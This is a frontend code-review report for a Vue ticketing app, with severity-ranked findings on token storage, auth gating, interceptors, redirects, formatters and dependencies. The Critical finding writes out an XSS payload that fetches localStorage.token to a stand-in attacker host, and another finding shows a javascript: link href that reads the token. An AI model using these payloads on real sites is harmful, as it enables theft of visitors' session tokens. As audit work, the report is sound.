# Section 11: Frontend architecture & shared infrastructure

## Scope

Read end-to-end:

- `vueapp/src/main.ts` (Vuetify setup, dayjs plugins, mitt, axios interceptors).
- `vueapp/src/App.vue` (root, splash, theme-from-branding wiring).
- `vueapp/src/router/router.ts` (every route definition, single `beforeEach`
  guard, lazy-import shape).
- `vueapp/src/stores/branding.ts` (the only Pinia-style store; module-scoped
  `reactive()` singleton + `loadBranding()`).
- `vueapp/src/helpers/AuthHelper.ts`, `TenantHelper.ts`, `TenantPermissions.ts`,
  `StripeHelper.ts`, `Filters.ts`, `EmailHelper.ts`, `Geocode.ts`,
  `QueryStringHelper.ts`, `ChartSetup.ts`.
- `vueapp/src/composables/useDragReorder.ts` (the only composable in the repo).
- `vueapp/src/components/NavBar.vue`, `Footer.vue`, `ImpersonationBanner.vue`,
  `SignaturePad.vue`, `RichTextView.vue`, `RichTextEditor.vue`, `PhoneField.vue`,
  `ExtrasPicker.vue`, `BuyAdmissionFlow.vue`, `TicketTiersList.vue`,
  `TicketTiersDialog.vue`, `BrandingImageSlot.vue`, `NewsletterSignup.vue`,
  `NotificationBell.vue`, `TopRidersWidget.vue`, `SocialShare.vue`,
  `PhotoCapture.vue`, `QrCode.vue`, `Spinner.vue`, `SurveyForm.vue`.
- `vueapp/src/views/Login.vue` (login redirect path after auth).
- `vueapp/src/views/Waiver.vue` (its `?next=` redirect handling).
- `vueapp/package.json`, `tsconfig.json`, `vite.config.ts`.

Spot-checked:

- A representative sample of `vueapp/src/services/*.ts`: `PassService`,
  `EventService`, `TicketService`, `UserService`, `TenantService`,
  `DashboardService`, `NotificationService`, `NewsletterService`,
  `SeasonPassService`, `SpectatorService`, `WaiverService`,
  `CustomerService`, `ExtraService`. The remaining ~16 service classes follow
  the same shape (constructor reads `import.meta.env.VITE_API_ENDPOINT`, every
  method `return axios.get<{ data: T }>(`${this.apiUrl}/...`)`).
- Cross-repo `grep` for: `v-html`, `localStorage`, `KIND_LABELS`,
  `priceCents.*toFixed`, `\(r\.data as any\)\.data`, `apiUrl: string`,
  `new \w+Service\(\)`, `window\.location`, `decodeJwt|atob\(`,
  `redirect:`, `router.push.*/Login`.
- `tsconfig.node.json` exists alongside `tsconfig.json` (referenced project).

Out of scope here (covered in prior sections):

- The `Home.vue:150` + `Footer.vue:77` `v-html` on `branding.aboutHtml` /
  `branding.refundPolicyHtml` and the `Admin/Campaigns.vue:73` preview
  `v-html` — flagged in Section 10. Re-listed below only as a one-line
  reminder so the Critical / High picture is complete for this section.
- The per-feature views (`BuyPass`, `BuySpectator`, `Admin/Events`, etc.) —
  audited in Sections 4 – 8.

## Architecture summary

**Single global `axios` instance with two interceptors.** `main.ts`
unconditionally registers a request interceptor that reads `localStorage.token`
and attaches `Authorization: Bearer <jwt>` plus `X-Tenant-Subdomain: <sub>`
from `tenantHelper.getSubdomain()`. Every service class is just a thin wrapper
around `axios.get/post/put/delete` against `import.meta.env.VITE_API_ENDPOINT`.
There is no per-service axios instance, no base URL on a shared client, no
custom timeout. The response interceptor logs 401 / 403 to the console, calls
`authHelper.logout()` on 401, and `router.push('/Login')`. There is no token
refresh, no retry, no in-flight de-dupe, no AbortController plumbing.

**State management is two singletons, no Pinia.** `branding` is a
module-scoped `reactive(...)` object populated once on app mount via
`loadBranding()`. `authHelper` is a module-scoped `reactive<AuthState>` plus a
default-exported object literal of methods. Components import the reactive
state directly (`import { branding } from '@/stores/branding'`,
`authHelper.isAuthenticated()`). There is no Pinia, no Vuex, no provide/inject
pattern. The reactive state propagates via Vue 3's reactivity system; this
works, but loses Pinia's devtools, plugin API, and `$reset` ergonomics.

**Routing is one flat array with a single `beforeEach` guard.** ~50 routes,
all lazy-loaded via `() => import(...)`. The guard checks `requiresAuth`,
`requiresPermission`, and `requiresRoles` against `authHelper`. There is no
nested layout route, no per-section `<router-view name="...">`, no error
boundary. 404 catches via `:pathMatch(.*)*` redirect to `/NotFound`.

**The JWT lives in `localStorage`.** Bootstrap reads it, decodes the payload
with `atob` to lift `UserId` + `role` claims (hydrating client-side state
without a network call), and checks `exp` to expire stale tokens at app start.
Cross-subdomain switching just re-reads the same `localStorage` (which is
origin-scoped, so per-subdomain it's a fresh login regardless). Impersonation
swaps the live token in `localStorage` and stashes the original in
`sessionStorage` so closing the tab loses the impersonation but the original
session persists.

**Branding drives Vuetify theme + favicon + document title.** `App.vue`'s
`watchEffect` mutates the existing theme objects in place (the comment notes
that reassigning loses reactive wiring — true) and applies primary / secondary
/ accent colors. `loadBranding` also calls `applyFavicon` (mutates `<link
rel="icon">`) and sets `document.title`. The pre-branding splash sits over the
whole app until `branding.loaded` flips true.

**Service classes are duplicative scaffolding.** 30 service files all start
with the same five lines: `class XService { private apiUrl: string;
constructor() { this.apiUrl = import.meta.env.VITE_API_ENDPOINT ?? '' } }`
followed by methods that all hand-construct `${this.apiUrl}/...` URLs and all
type response as `axios.get<{ data: T }>` — meaning every call site then has
to write `(r.data as any).data` to peel off the wrapper (167 occurrences
across 58 files). The wrapper type is annotated but never reached because of
the `as any` cast pattern.

## Inline fixes applied during this review

None. Section 11 is read-only review; the findings below all require design
or multi-file changes.

## Findings

| Severity | Location | Description | Suggested fix |
|---|---|---|---|
| **Critical** | `vueapp/src/main.ts:74-89` + `AuthHelper.ts:71-79` — **JWT in `localStorage` is reachable by any XSS, including the three `v-html` surfaces Section 10 flagged** | The token sits in `localStorage` (readable by any script in the origin) and the axios interceptor attaches it to every outbound request. Section 10 surfaced stored XSS in `Home.vue:150` + `Footer.vue:77` (`v-html="branding.aboutHtml"` / `branding.refundPolicyHtml`) and `Admin/Campaigns.vue:73`. The tenant admin's HTML reaches every visitor's home page and the footer's refund-policy dialog. With the token in `localStorage`, a tenant admin pasting `<img src=x onerror="fetch('https://attacker/'+localStorage.token)">` into the About panel exfiltrates every visitor's session token — including any tenant_admin who later visits their own home page. The JWT is bearer-only (no `httponly`, no CSRF token, no IP binding) so the stolen token is fully replayable for the 24-hour TTL, and impersonation tokens can be stolen the same way during a support call. The fix needs to be in two places: (a) fix the XSS (Section 10 Highs); (b) move the token to an httponly cookie — even with the XSS, an httponly cookie can't be read by JS. | Move the token to an httponly + secure + samesite=lax cookie set by the API on login (`Set-Cookie: rp_token=...`). Drop the request interceptor's `Authorization: Bearer` and let the browser attach the cookie. Add a CSRF token (double-submit cookie) and have the response interceptor read it from a `X-Csrf-Token` response header on login and attach it on writes. Until then, **at minimum** apply the Section 10 fix to swap the three `v-html` sites for `<RichTextView :html="..." />`. Also add a `Content-Security-Policy` header from the API (`default-src 'self'; img-src 'self' data: https:; script-src 'self' https://js.stripe.com`) so even a stored XSS can't `fetch()` off-origin. |
| **High** | `vueapp/src/main.ts:91-117` + every service call site — **401 interceptor races with in-flight requests** | The response interceptor calls `authHelper.logout()` + `router.push('/Login')` on **any** 401, including ones that the calling code is about to handle (e.g., `Waiver.vue:118` deliberately swallows 401 with `.catch(() => ...)`; same in `NotificationBell.vue:103` polling). Because the interceptor mutates global state synchronously, the user is yanked to `/Login` mid-task even when the call site doesn't care about the 401. Worse, if the page makes N parallel requests on mount (BuyAdmissionFlow makes 3 — tiers, vouchers, profile — and the dashboard makes more), a single 401 cascades a logout + redirect while the other N-1 requests are still in flight and will resolve into a logged-out app. There's no in-flight de-dupe of the redirect, no check that the request was for an auth-required path, no exception list. | Two changes: (a) in the interceptor, only redirect on a 401 from a write path or an explicit `requiresAuth` route; for read paths that the calling code might be handling, just reject without logging the user out, and let the calling code decide. (b) Add a small "logging out" flag so concurrent 401s only fire `router.push('/Login')` once. Optionally inspect `error.config.url` for the `/User/Login` path and skip the interceptor entirely for those (avoiding the recursive logout-on-login-failure case). |
| **High** | `vueapp/src/views/Login.vue:55-66` — **login ignores `?next=` query** | The router does `next('/Login')` on a guard-fail, but doesn't pass the original path. Several places (`Waiver.vue:112`, `WaitlistConfirm.vue:186`) correctly push `/Login?next=...`, but `Login.vue.login()` never reads `route.query.next`. After auth it hardcodes `/SuperAdmin`, `/Admin/Dashboard`, or `/` based on role — so a deep link to `/Admin/Events/{id}` that bounced to login lands the user on `/Admin/Dashboard`, not the original page. The router guard in `router.ts:343` (`if (to.meta.requiresAuth && !authHelper.isAuthenticated()) { next('/Login') }`) similarly drops the original `to.fullPath`. This is a UX bug for riders bookmarking pages and a real friction point for tenant admins clicking notification email links. | (a) Change the router guard to `next({ path: '/Login', query: { next: to.fullPath } })`. (b) In `Login.vue.login()`, after `setToken/setUserId/setRole`, read `route.query.next` and prefer it over the role-based default when it's a same-origin path that the user is permitted to see (`router.resolve(next).matched.length > 0`). (c) Apply the same to `main.ts:106` (the 401 interceptor's `router.push('/Login')` — pass `route.fullPath` as `next`). |
| **High** | `vueapp/src/helpers/AuthHelper.ts:23-31` (`decodeJwt`) — **client-side gating reads role from the token payload, not from a `/Me` round-trip** | The bootstrap path reads `decoded.UserId` and `decoded.role` from the JWT payload and writes them to `localStorage` AND to `state.role`. `permissionsForRole(state.role)` then drives the admin-menu visibility (`NavBar.vue:198`) and the router-guard `requiresRoles` check (`router.ts:353`). The problem: if a server-side role demotion happens (tenant admin demotes a manager to cashier; super admin disables an account) before the token's 24-hour TTL expires, the client keeps showing the old admin menu and the old admin routes — the server's 403 lands only when the user actually clicks an admin endpoint. The user sees a UI they're no longer entitled to and admins look at audit logs wondering why the "removed" user still showed up. For impersonation it's worse: the impersonation token's role is the *target's* role; if super admin starts impersonating a tenant_admin and the tenant_admin gets demoted during the session, the impersonator still sees admin UI. | Hit a `/User/Me` endpoint on app boot (and post-login) to authoritatively fetch the live role + permissions, and use that to populate the reactive state. Treat the JWT claims as a fast-path bootstrap only and overwrite from `/Me`. While there: surface a `permissions` array from the server rather than rederiving from role on the client (the `Dashboard.vue` snapshot already returns `permissions` in `DashboardSnapshot.permissions` — this is the right shape; generalize it). On a 403 from any admin endpoint, refresh the role and re-evaluate the router guard. |
| **High** | `vueapp/src/router/router.ts:342-358` (`beforeEach`) — **client-side gating only, no server-side back-stop on the SPA's first paint** | The guard hides admin routes from the menu when `requiresPermission` fails, but the *page bundles* are lazy-loaded; once the user is authenticated, deep-linking to `/Admin/Events/{id}` triggers the lazy import, mounts the view, and the view runs its `onMounted` API call before the server replies 403. The user sees a flash of admin UI (empty card, "Loading..." spinner, then a snack of an error) instead of a "Not authorized" page. The server-side authorization is in place (Section 1 audited it) so there's no data leak — just a confusing UX and a hint to attackers about what admin pages exist. The bigger issue: `requiresPermission` is checked against `authHelper.hasPermission(...)` which reads from a stale role (per the previous finding). A user demoted server-side can still navigate to an admin route until they reload. | (a) Add a `/Forbidden` route + redirect from the guard when `requiresPermission` fails AND the role IS loaded (instead of bouncing to `/` which is the rider home; the empty-handed UX implies "page not found" rather than "you don't have access"). (b) Per the previous finding, refresh role/permissions from `/Me` before the guard runs (or at least on every navigation). (c) Add a global axios response handler for 403 that flashes "You don't have permission to do that" rather than the per-page handlers each doing their own thing. |
| **High** | `vueapp/src/stores/branding.ts:217-219` (`loadBranding` `catch`) — **silent failure leaves `branding.loaded = false` forever; the splash never lifts** | When `axios.get('/Tenant/Branding')` rejects (network error, 5xx, CORS misconfig, tenant subdomain not yet provisioned), the `catch` block does `console.error` and returns. `branding.loaded` stays `false`, the splash in `App.vue:8` covers the entire app indefinitely, and there's no retry button or error fallback. A tenant who clicks a stale subdomain link sees a permanent white splash with the helmet icon and the word "RidePass". | In the catch: (a) set a `branding.loadError = true` flag and surface it in `App.vue` with a "Couldn't reach the server. [Retry]" message that re-invokes `loadBranding()`; (b) if the subdomain is unknown (404), redirect to the apex `https://ridepass.io/Discover` so the user can find the right track; (c) for transient errors retry once with a backoff before showing the error. Same applies to the failed `loadProfile` paths in BuyAdmissionFlow which swallow errors with a comment "non-fatal" — at least set a flag so the next click can surface "try again." |
| **High** | `vueapp/src/components/Footer.vue:77` (`v-html="branding.refundPolicyHtml"`) + `views/Home.vue:150` + `views/Admin/Campaigns.vue:73` — **stored XSS surface (re-flag from Section 10)** | Already in Section 10 as High. Repeating here because Section 11's review of the auth-token storage (`localStorage`) elevates the blast radius from "deface tenant home page" to "exfiltrate every visitor's session token, including admins." See the Critical above. | Per Section 10: swap to `<RichTextView :html="..." />`. Per the Critical above: also move the token to an httponly cookie so even an XSS can't read it. |
| **High** | `vueapp/src/composables/useDragReorder.ts:43-60` — **renumber happens before the server save and is never rolled back on failure** | `onReorderEnd` mutates `opts.rows.value` (renumbering every row's `sortOrder` to `i * 10`) **before** awaiting the save. If the save fails, the only recovery hook is the consumer's `onError` callback. In `TicketTiersList.vue:154` the consumer does call `load()` to refetch from the server, but consumers without an `onError` (or with a buggy one) leave the UI showing the new order while the server still has the old one. The next reload silently snaps back to the old order, confusing the admin. There's no "saving..." indicator and no per-row optimistic-update marker. | Two-part fix: (a) snapshot the old `rows.value` before the optimistic renumber so the composable can revert on its own if `onError` isn't supplied (or even if it is — defense in depth); (b) expose a `saving` ref the consumer can bind to a row-level overlay or a toast so the admin sees the in-flight save. While there, consider debouncing rapid reorders (drag a row twice in 200ms) so we don't fire two saves that race each other. |
| **Medium** | `vueapp/src/services/*` (30 files) + 167 occurrences of `(r.data as any).data` — **typed wrapper is purely cosmetic** | Every service method declares `axios.get<{ data: T }>(...)` but every call site reaches into `r.data` with `as any` to peel the wrapper. Net effect: the response type is declared once but defeated everywhere, and TypeScript can't catch the case where the server changes a field name. A small `apiResult<T>(p: AxiosResponse<{ data: T }>): T => p.data.data` helper, or a custom axios instance with a response interceptor that auto-unwraps `{ data: ... }`, would eliminate the cast from every call site and give the inner `T` real teeth. The wrapper format is consistent (server-side `ApiResponse<T>`) so this is a one-time refactor with very high reach. | Add a shared `unwrap<T>(promise)` helper (or a typed `apiClient.get<T>` wrapper) and replace `(r.data as any).data` with `await unwrap(svc.foo())`. While doing the refactor, drop the per-service `apiUrl` constructor: a single `apiClient` with `baseURL` configured from `import.meta.env.VITE_API_ENDPOINT` reads from the env once at module load, and every service becomes a pure namespace of functions instead of a class. The classes have no state other than `apiUrl`, so they don't need to be classes. |
| **Medium** | `vueapp/src/services/*` + every consumer — **no AbortController, no cancellation on unmount** | None of the services accept an `AbortSignal`; none of the consumers cancel in-flight requests when the user navigates away. The expensive cases are: `Dashboard.getSnapshot()` (large payload, often slow), `EventService.list()` on Calendar (called on every range change — fast-clicking the prev/next month buttons stacks requests), `NotificationService.poll()` in NotificationBell (1-minute interval; on a long-running session a stuck request can pile up). Memory-leak risk is low (axios cancels via `AbortController` if you pass a signal; otherwise the response just resolves to a dead component, which Vue tolerates) but the dev-console gets noisy with "Cannot read property of undefined" on unmounted components after navigation. | Plumb a single `AbortController` per component or per route, pass `signal` through every service call, and `abort()` in `onBeforeUnmount`. Pinning calendar navigation to a per-month-change controller (abort prev when starting next) is the highest-leverage place to start. Most service classes need the signature `list(args, { signal }: { signal?: AbortSignal } = {})`. |
| **Medium** | `vueapp/src/helpers/Filters.ts` (entire file) + the codebase — **shared formatter helper is barely used; almost everyone inlines `(cents / 100).toFixed(2)`** | `Filters.currency(value)` exists but takes dollars, not cents. Across the app there are 22+ occurrences of `(\w+Cents / 100).toFixed(2)` inline, sometimes wrapped in `$${...}`. There's also one-off `formatMoney(cents)` helpers in `BuyAdmissionFlow.vue:703` and elsewhere. No shared `formatCents(cents: number): string` exists. Similarly, `Filters.date()` and `Filters.dateTime()` exist but most views use `dayjs.utc(x).tz(branding.timezone).format(...)` inline (56 files across the codebase). The Section 10 finding on timezone consistency applies here too: `Filters.date()` uses `new Date(value).toLocaleDateString()` which renders in the *browser's* timezone, not the tenant's — so any admin viewing data from a different timezone sees the wrong date. | Add `formatCents(cents: number | null | undefined): string` and `formatCentsCompact(cents)` (no decimals for whole-dollar values, useful for the TopRiders widget) and `formatTenantDate(iso, fmt?)` that always tz-converts via `branding.timezone`. Then deprecate `Filters` (or rewrite it to call the new helpers) and codemod the 22+ inline `(cents / 100).toFixed(2)` sites. While there, drop the buggy `Filters.currency` regex `\d(?=(\d{3})+\.)/g` (works only when the value has a decimal point, hence the `toFixed(2)` requirement — `Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' })` is the right tool). |
| **Medium** | `vueapp/src/components/PhoneField.vue:30-48` — **US-only formatting silently mangles international numbers** | `formatPhone` strips to 10 digits max, formats `(XXX) XXX-XXXX`. Any international number entered (`+44 20 7946 0958`, `+1 800 555 0100`) gets reformatted into a 10-digit US shape, which produces wrong digits or silently drops the country code. Riders entering their own phone in `User/Profile` will lose digits and the SMS dispatch (Twilio for waitlist confirms, per Section 4) sends to the wrong number — silent failure. The `watch(props.modelValue, ...)` mutates the parent's value `immediate: true` so existing international numbers loaded from the server get clobbered the moment the field mounts. | If the input starts with `+`, pass it through unchanged (just clean whitespace). If it has 11 digits starting with 1, format as `+1 (XXX) XXX-XXXX`. Otherwise format US-style. The Footer.vue:113 `phoneFormatted` computed already does most of this — extract it to a shared helper and reuse from both. Longer-term, integrate `libphonenumber-js` (10kb min+gzip with metadata for one country) which is the standard answer here; or at least take a `country` prop and only format when it's `US`. |
| **Medium** | `vueapp/src/helpers/AuthHelper.ts:60` (`isImpersonating = computed(...)`) — **misuse of `computed` on non-reactive source** | `isImpersonating` is a `computed()` that reads `sessionStorage.getItem(ORIGINAL_TOKEN_KEY)` — sessionStorage is **not** reactive. The computed re-runs only when one of its (zero) reactive deps changes, so it caches the first-mount value and never updates. The exported `isImpersonating` const therefore returns a stale value forever. `ImpersonationBanner.vue:26-36` works around this with a `tick` ref that's incremented on every route change, but only that component. Any other consumer that imports `isImpersonating` (or worse, the methodsversion `authHelper.isImpersonating()` which also reads sessionStorage directly) will see stale data after the user clicks "Stop" without a route change. | Either (a) move `impersonatedLabel` and a derived `isImpersonating` flag fully into the `reactive` state and update them in `startImpersonation` / `stopImpersonation` / `logout` — same way `state.token` is already handled; or (b) drop the `computed` entirely and have consumers call the method form, which always reads fresh. (a) is the correct fix because it keeps reactivity wired. |
| **Medium** | `vueapp/src/components/RichTextEditor.vue:75-80` — **Tiptap Link extension allows arbitrary `href` (including `javascript:`)** | The editor uses `@tiptap/extension-link` with `openOnClick: false, autolink: true` and `toggleLink` calls `window.prompt('Link URL', ...)` with no validation. A tenant admin can paste `javascript:alert(localStorage.token)` into the link URL prompt; Tiptap will store it as the `href`. RichTextView's DOMPurify `ALLOWED_ATTR: ['href', 'target', 'rel']` doesn't block `javascript:` schemes by default (DOMPurify *does* block `javascript:` in `<a href>` since v3 by default, so this is actually safer than it sounds — but only on the view path). On the editor path the admin can save the malicious href, the server persists it, and a downstream surface that doesn't go through RichTextView (per Section 10's `v-html` finding) renders it raw. | (a) In the editor, validate the prompt input: only allow `https://`, `http://`, `mailto:`, `tel:` schemes; reject everything else with a snack. (b) Ensure DOMPurify is on every rendering path (per the Section 10 finding). (c) Add `rel="noopener noreferrer"` and `target="_blank"` to all editor-inserted links so they don't bleed referrer or open in the same tab. |
| **Medium** | `vueapp/src/stores/branding.ts:150` (`loadBranding`) + every reactive consumer — **no refresh path, no per-tenant cache** | `loadBranding` runs exactly once, in `App.vue:36-38` `onMounted`. There's no exported `refreshBranding()`, no subscriber pattern for tenants who edit their own branding (the Admin/Settings/Branding page saves to the API but the live branding state — and therefore the in-tab Vuetify theme, favicon, document title, displayed `branding.displayName` — doesn't update until the user refreshes). On apex (`tenantHelper.getSubdomain()` returns null), the early return at line 151 means the `branding` reactive state stays in its `defaults` shape forever; views that gate UI on `branding.tenantId` (which stays `""`) will silently misbehave. | (a) Export a `refreshBranding()` from the store and call it from every Admin/Settings save handler so the user sees their edits applied in-tab. (b) For apex, set `branding.loaded = true` after the early-return so the splash lifts — and have apex-only views (`Discover.vue`, the apex Home) handle the empty-tenantId case explicitly. (c) Consider adding a per-subdomain cache key in localStorage so re-mounts (e.g., hard refresh) can paint the splash with the previous tenant's colors before the API responds, hiding the white flash. |
| **Medium** | `vueapp/src/components/NotificationBell.vue:97-106` — **`setInterval(poll, 60_000)` polls forever, ignores tab visibility** | The bell polls `/Notification/UnreadCount` every 60s for the entire session, regardless of whether the tab is in the foreground. Each poll attaches the JWT, so a stale tab keeps making authenticated requests forever (until the 24-hour token TTL expires, at which point the response interceptor fires `logout()` + `router.push('/Login')` — see the High above on the interceptor race condition). The 60s cadence is also too tight if the user has 20 tabs open. | Use `document.visibilityState === 'visible'` as a precondition for `poll()` (skip when hidden), and re-poll once on `visibilitychange → visible` so the bell freshens on tab refocus. Better still: SSE or WebSocket to push the unread count and drop polling entirely. |
| **Medium** | `vueapp/src/services/*` — **every service is `new`'d at every consumer mount** (~112 occurrences of `new \w+Service\(\)`) | Each component does `const service = new PassService()` at setup. With 30 service classes each holding a single `apiUrl` field, this is cheap but it creates a new "instance" per mount and bypasses any future per-instance state (e.g., per-service cancel-controller registry, per-service in-flight de-dupe). It's also a smell that the service is doing nothing classes provide — no state, no inheritance. | After the typed-wrapper refactor (per the related Medium), the services can be plain namespaces (`export const PassApi = { listActive: () => api.get(...) }`) and consumers just call `PassApi.listActive()`. Drops the `new`, drops the per-service `apiUrl` constructor noise, and gives a single base URL to swap if you ever introduce a staging API or per-environment override. |
| **Medium** | `vueapp/package.json` — **stale typescript / vue-tsc / vite versions; unused `vue-meta` and `vue-gtag`** | `typescript@^4.8.4`, `vue-tsc@^1.8.3`, `vite@^4.3.9` are all 18+ months behind. TS 5.x has been stable for 18 months; vite 5 / 6 for similarly long. `vue-meta@^3.0.0-alpha.10` is listed but **not imported anywhere** in `src/` (grep confirms — only `package-lock.json` and `package.json` reference it). `vue-gtag@^2.0.1` is similarly imported nowhere (no analytics wiring). Both add to the install footprint and `node_modules` audit surface for zero runtime value. The 4.x typescript also blocks adopting the typed-wrapper refactor that uses const type parameters / satisfies, both 5.x-only ergonomics. | Drop `vue-meta` and `vue-gtag` from package.json. Bump `typescript` to `^5.6`, `vue-tsc` to `^2.x` (matched to TS 5), `vite` to `^5.x`, and run `vue-tsc --noEmit` to surface any new diagnostics (probably trivial). Defer the vue / vuetify / tiptap bumps to their own pass (they're more disruptive). |
| **Medium** | `vueapp/src/views/Login.vue:54-59` — **manual stamping of `userId` / `role` from the response body, parallel to the JWT** | Login does `authHelper.setToken(token); setUserId(userId); setRole(role)` — the same three values are also in the JWT payload that `AuthHelper.decodeJwt` reads on bootstrap. If the server's response body ever drifts from the JWT claims (e.g., the response says `role: 'tenant_admin'` but the JWT carries `role: 'tenant_manager'` because of a server-side cache issue), the client trusts the response body. The JWT claims are the source of truth (the server uses them for auth); the response body is just a convenience copy. | Drop the response body's `userId` + `role`. After `setToken(token)`, call a shared `hydrateFromToken()` that re-runs the same `decodeJwt` + claim-extraction the bootstrap path uses. One source of truth. Also dovetails with the "fetch /Me after login" finding above — `/Me` is the authoritative server-side state that supersedes both. |
| **Medium** | `vueapp/src/router/router.ts:343-358` (`beforeEach`) — **`requiresPermission` failure redirects to `/` (rider home)** | A tenant_scanner who deep-links to `/Admin/Reports` gets bounced to `/` (the public rider home), which is confusing — they're a scanner, not a rider, and `/` shows them BuyPass calls-to-action. Same for any role that lacks a checked permission. There's no "Forbidden" page, no toast, no nothing — just a silent redirect. | Add a `/Forbidden` route + push to it with the original `to.fullPath` so the page can render "You're signed in as <role> — that page requires <permission>. [Back to Dashboard]". Same fix when `requiresRoles` fails. |
| **Medium** | `vueapp/src/components/NavBar.vue:198` (`allowed(link)`) — **NavBar permission gating reads `authHelper.hasPermission` once per render but the underlying state isn't reactive to role changes** | `authHelper.hasPermission(perm)` is called inside a `computed` (`directLinks`, `visibleGroups`), so it re-runs when its reactive deps change. But the deps are nothing (the function reads `state.role` and the imported `permissionsForRole`); `state.role` *is* reactive (it's a key on the `reactive(...)` block), so this *does* re-evaluate when role changes. So this finding is actually OK — flagging only as a "verify intent" item because the indirection through the method call obscures the reactive dependency. A future contributor reading the code might cache the result or memoize, breaking reactivity. | Document the reactive dependency in a comment, or change the access pattern to read `authState.role` directly (so the dependency is visually obvious). Same applies to `ImpersonationBanner.vue`'s `tick` workaround — once the `isImpersonating` reactivity finding is fixed, that workaround can go. |
| **Medium** | `vueapp/src/views/Waiver.vue:132-135` (`goBack`) — **`router.push(next)` blindly trusts `?next=` query** | `goBack` reads `route.query.next` as a string and `router.push(next)`. Vue Router's `push(string)` interprets the string as a location: if it's a relative path it stays internal (safe), but if it's like `/Admin/Events/{id}` and the user doesn't have `catalog.manage`, the router guard catches it. The risk vector: a phishing email that links to `https://acme.ridepass.io/Waiver?next=/SuperAdmin` doesn't actually let the attacker escape the SPA — the worst case is an internal redirect that the guard handles. **But** if a future change ever `window.location.href = next` instead of `router.push`, this becomes an open redirect. Same shape in `Login.vue` (once you wire `?next=` per the finding above) and the 401-interceptor when it learns about `?next=`. | Validate `next` is (a) a non-empty string starting with `/`, (b) not starting with `//` (protocol-relative), (c) doesn't contain `://`. Reject any other shape and fall back to the role-default. This is a one-liner that prevents an entire class of redirect-based phishing in the future. |
| **Low** | `vueapp/src/types/cart/` — **empty directory** | The directory exists but contains nothing. Either it's a leftover from a planned refactor or git noise from an unfinished `git mv`. | Remove. Same shape: anything else under `src/types/` that's unused should be pruned. |
| **Low** | `vueapp/src/helpers/EmailHelper.ts` (entire file) — **single-method helper with a regex that doesn't match all valid emails** | `isValid` uses `/^[^\s@]+@[^\s@]+\.[^\s@]+$/` which rejects `user@localhost` (no TLD, used in dev) and accepts things like `user@@example.com` only because of the `\s` exclusion. The DOM `input[type=email]` validity check + a server-side check is the right approach. | Use a tighter regex, or delete the helper and rely on the `<v-text-field type="email">` browser validity + server-side `[EmailAddress]` validation. For client-side validation in custom validators, `dompurify`-style normalization is wrong here; a stricter regex (or `email-validator` npm) is fine. |
| **Low** | `vueapp/src/views/Admin/Dashboard.vue:375-386` + `views/Admin/Purchases.vue:227-238` — **`KIND_LABELS` is duplicated verbatim** | Both files define the exact same `KIND_LABELS: Record<string, string>` map for the v_recent_sales kinds (`pass`, `event_ticket`, `event_extra`, `season_pass`, `membership`, `gift_card`, `rental`). A third copy lives in `Admin/RedeemTickets.vue:188` and `Admin/Counter.vue:866` (slightly different shapes — kindLabel of "pass" etc.). When you add an eighth kind, you'll have to remember to update all four. The `ExtraService.kindLabel` is a different concept (extra kinds, not sale kinds) — that's separate and fine. | Extract a single `vueapp/src/helpers/SaleKinds.ts` exporting `SALE_KIND_LABELS` and `kindLabel(kind: string)`. Cross-reference with the `/recent-sales-view` skill in the CLAUDE.md — adding a new sale kind already needs migration + view + repository + frontend label work; making the label one place to update reduces the surface for that flow. |
| **Low** | `vueapp/src/services/SeasonPassService.ts:104` + several others — **method name mismatch** (`deleteProduct` instead of just `delete`) | Most services follow `delete(id)` for DELETE methods (`PassService.deleteProduct`, `EventService.delete`, `TicketService.deleteTier`). `SeasonPassService.deleteProduct` (and `NewsletterService.deleteSubscriber`) use a method name that differs because `delete` is a reserved word in strict JavaScript and TS doesn't error on it being a method name but linters often complain. Minor inconsistency. | Pick one convention (probably `delete` since it's already in TicketService) and codemod. If using `delete` is fragile for linters, use `remove(id)` everywhere instead. |
| **Low** | `vueapp/src/components/SignaturePad.vue:90` — **canvas `toDataURL('image/png')` produces large payloads** | A 600×180 signature renders at ~30–60KB base64. On the spectator-buy path (`BuySpectator.vue`) each spectator entry carries its own signature data URL in the request body. A four-spectator purchase posts ~150–250KB just in signature payloads. Section 7 already noted server-side that signatures aren't capped — flagging the client side here. | Pass `toDataURL('image/jpeg', 0.6)` instead — quality 0.6 JPEG is visually identical for a B&W signature and drops to ~8–15KB. Or downscale the canvas before encoding. Either way, also cap the input height (`props.height` is unbounded) so an oversized pad doesn't multiply the payload. |
| **Low** | `vueapp/src/components/RichTextView.vue:14-19` — **`ALLOWED_ATTR` strips `class` and `id`, which break common pasted content** | Tenants pasting from Word / Google Docs into the editor get `<p class="MsoNormal">` etc. The editor itself probably strips most of this (Tiptap normalizes), but the view-side allowlist blocking `class` means even legitimate styling the editor *did* preserve gets dropped. Low risk. | If consumers ever need class-based styling, allow `class` with a CSS allowlist (or use `ATTR_ALLOWED_PROPS` style). Today the view-side is correctly conservative; just be aware if expanding the editor. |
| **Low** | `vueapp/src/main.ts:40-41` — **VSnackbar default `location: 'top'` overrides Vuetify's default** | Set globally so every snackbar appears at the top. Section 12 (UX) probably calls out that several views still pass `location="top"` redundantly. Cosmetic. | Drop the per-component `location="top"` (e.g., `BuyAdmissionFlow.vue:404`) since the global default handles it. |
| **Low** | `vueapp/src/views/Calendar.vue:690-693` — **`SHOW_HOURS_KEY` in localStorage** | The calendar persists a user pref (show hours toggle) in localStorage. The only non-token use of localStorage in the codebase. Per-user pref is fine here; flagging only because PII-in-localStorage was on the review checklist and this is the only other writer. | No change needed. |
| **Low** | `vueapp/src/helpers/Geocode.ts:13-15` — **Nominatim usage without a Referer/UA header outside the browser** | Nominatim's policy asks for a meaningful User-Agent and ≤1 request/sec. From the browser, Referer is auto-set but User-Agent isn't customizable. If the admin uses this autocomplete-style (typing into the city field with debounced lookups), the per-second rate could exceed Nominatim's policy and they'll start returning 429s. | Add a real debounce (≥1.5s after last keystroke). Add a one-shot cache (Map<query, result>) so the same query during a session doesn't re-hit. Long-term, use Google Geocoding or Mapbox for production. |
| **Low** | `vueapp/src/main.ts:121` — **global `emitter` is registered but never used** | `mitt` is installed and `app.config.globalProperties.emitter = emitter` is set, but no component in `src/` calls `this.$emitter.*` (composition API doesn't expose `this`, and grep finds no `emitter.on/emit/off`). Dead code. | Either delete the registration (and uninstall mitt from package.json) or document that it exists for a planned use case. Two-line change. |
